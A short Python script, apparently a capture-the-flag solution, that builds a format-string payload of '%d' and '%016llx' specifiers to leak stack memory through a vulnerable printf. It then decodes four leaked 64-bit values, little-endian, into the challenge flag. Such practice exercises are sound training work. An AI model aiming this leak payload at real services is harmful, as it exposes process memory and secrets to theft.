payload1 = "%d " * 5 + "%016llx," * 50

print(payload1)

solve1 = [0x3445727b67616c66,0x66546e3172505f64,0x6f735f656430635f,0x000a7d597a34655f]
b = []
for ll in solve1:
    for p in range(8):
        b += [(ll >> (p * 8)) & 255]
print(bytes(b))